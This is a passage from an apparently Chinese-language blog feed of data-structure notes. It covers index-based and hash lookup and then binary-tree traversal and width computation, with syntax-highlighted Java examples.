                <span class="token keyword">return</span> mid<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> high<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="索引查找"><a href="#索引查找" class="headerlink" title="索引查找"></a>索引查找</h2><p>​        除了顺序查找，上面所有的查找算法的潜在条件就是数组有序，那如果数据本身无序，我们又想保证高性能的查询，我们可以为数据加上索引，每本书都有一个目录页，记录每个章节的页码，这样我想看具体的某一章，可以根据页码迅速定位。</p>
<blockquote>
<p>但这样做又需要注意：</p>
</blockquote>
<ol>
<li>索引不能重复，这里牵扯到哈希碰撞的解决方案</li>
<li>相比原数据，我们需要维护一个索引数据，空间换时间思路</li>
<li>索引的更新</li>
</ol>
<blockquote>
<p>这里又有了不同的选择，顺序索引和哈希索引</p>
</blockquote>
<p>​        其实数组中我们通过下标去直接访问数据，下标不就是一种索引嘛。我们可以顺着第一个下标，一直找到最大下标值所指的数据。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        如果我们顺序的插入数据，第一个数插入index=0的位置，第二个数插入index=1的位置。那么可以理解下标index为顺序索引，它不仅指向实际的数据，索引与索引间存在顺序关系，arr[i-1] 在 arr[i] 之前插入。这样做的好处有什么呢？我们可以一次性找到某个索引后所有的数据，但是顺序索引的缺点就是我们需要顺序比较判断，就像顺序查找一样，不过可做二分优化。</p>
<p>​        这里我们可以想想Mysql中Innodb中使用B+树结构作为索引，该结构就有索引有序的特点。方便我们进行索引筛选的功能。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'a'</span><span class="token punctuation">;</span>
    arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'b'</span><span class="token punctuation">;</span>
    arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'c'</span><span class="token punctuation">;</span>
    arr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'d'</span><span class="token punctuation">;</span>
    arr<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'e'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        还有一种实现是Hash索引，这里不对Hash计算深究，比方说第一个数，我们进行对Key进行Hash计算结果为1002，我们底层通过数组来实现存储，数组长度为5，则将1002余5，等于2，则我们不插入到0位置，而是直接插入到2位置，下一次可能插入4位置，这样索引与索引间不再存在顺序关系，但好处是，可以在常数时间内查找到对应的数据，</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        每种算法都在原有算法的基础上对其进行一方面的优化，每种算法都有自己适用的范围，没有最好的，只有最合适的，这需要我们对每个算法的底层实现有着清晰的认识，从而根据具体的场景进行选择。</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>第三章：二叉树问题</title>
    <url>//post/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%AC%AC%E4%B8%89%E7%AB%A0%EF%BC%9A%E4%BA%8C%E5%8F%89%E6%A0%91%E9%97%AE%E9%A2%98.html</url>
    <content><![CDATA[<h1 id="树形dp套路"><a href="#树形dp套路" class="headerlink" title="树形dp套路"></a>树形dp套路</h1><p><strong>在做树结构的题目中，如果求解规则可以分为，以某个节点为子树，先向左要数据，再向右要数据，最后返回总数据，我们就可以使用该套路。</strong></p>
<ol>
<li><p><strong>递归进行遍历</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">QTraverse2</span><span class="token punctuation">(</span><span class="token class-name">Point</span> tree<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>tree <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"先序"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">QTraverse2</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"中序"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">QTraverse2</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"后续"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p><strong>非递归进行遍历</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//非递归前序遍历  使用栈</span>
   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">QTraverse1</span><span class="token punctuation">(</span><span class="token class-name">Point</span> tree<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Point</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       stack<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token class-name">Point</span> pop <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>value <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token keyword">if</span> <span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
               stack<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
           <span class="token keyword">if</span> <span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
               stack<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span>

   <span class="token comment">//非递归中序遍历</span>
   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">ZTraverse1</span><span class="token punctuation">(</span><span class="token class-name">Point</span> tree<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Point</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       stack<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token keyword">while</span> <span class="token punctuation">(</span>tree<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
               stack<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
               tree <span class="token operator">=</span> tree<span class="token punctuation">.</span>left<span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
           <span class="token class-name">Point</span> pop <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>value <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token keyword">if</span> <span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
               stack<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
               tree <span class="token operator">=</span> pop<span class="token punctuation">.</span>right<span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span>

   <span class="token comment">//非递归后序遍历</span>
   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">HTraverse1</span><span class="token punctuation">(</span><span class="token class-name">Point</span> tree<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Point</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Point</span><span class="token punctuation">></span></span> stack1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       stack<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token class-name">Point</span> pop <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           stack1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token keyword">if</span> <span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
               stack<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
           <span class="token keyword">if</span> <span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
               stack<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
       <span class="token punctuation">&#125;</span>
       <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack1<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>stack1<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p><strong>宽度遍历</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//宽度遍历  也就是将二叉树一行一行的遍历</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">WideTraverse</span><span class="token punctuation">(</span><span class="token class-name">Point</span> tree<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//关键就是我们需要知道我们遍历节点的层数  我们可以使用LinkedList(Java提供的队列 先进先出)</span>
        <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Point</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>list<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Point</span> pop <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>value <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p><strong>求二叉树的宽度</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//求二叉树的宽度  也就是求出整棵树哪一行的节点最多  使用map和栈（不灵活）</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">GetWid</span><span class="token punctuation">(</span><span class="token class-name">Point</span> tree<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Point</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tree<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Point</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        stack<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> flor <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Point</span> pop <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//从栈中pop出的元素的层数</span>
            <span class="token class-name">Integer</span> num <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>value <span class="token operator">+</span> <span class="token string">" 层数："</span> <span class="token operator">+</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">></span> flor<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                flor <span class="token operator">=</span> num<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right<span class="token punctuation">,</span> num <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                stack<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left<span class="token punctuation">,</span> num <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                stack<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">//所有层的元素个数已经统计出  也知道有多少层了</span>
        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ints <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>flor <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token punctuation">&lt;</span><span class="token class-name">Point</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span><span class="token punctuation">></span></span> entries <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Point</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> entry <span class="token operator">:</span> entries<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            ints<span class="token punctuation">[</span>entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> ints<span class="token punctuation">[</span>entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> anInt <span class="token operator">:</span> ints<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>anInt <span class="token operator">></span> max<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                max <span class="token operator">=</span> anInt<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"最大节点数："</span> <span class="token operator">+</span> max<span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token punctuation">&#125;</span>

    <span class="token comment">//求二叉树的宽度  使用队列和map</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">GetWidByLinkedList</span><span class="token punctuation">(</span><span class="token class-name">Point</span> tree<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Point</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Point</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tree<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//当前所在行</span>
        <span class="token keyword">int</span> curLevel <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token comment">//所在行节点数</span>
        <span class="token keyword">int</span> curNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token comment">//整棵树最多节点</span>
        <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>list<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Point</span> pop <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Integer</span> level <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>level <span class="token operator">==</span> curLevel<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                curNum<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> curNum<span class="token punctuation">)</span><span class="token punctuation">;</span>
                curNum <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                curLevel <span class="token operator">=</span> level<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
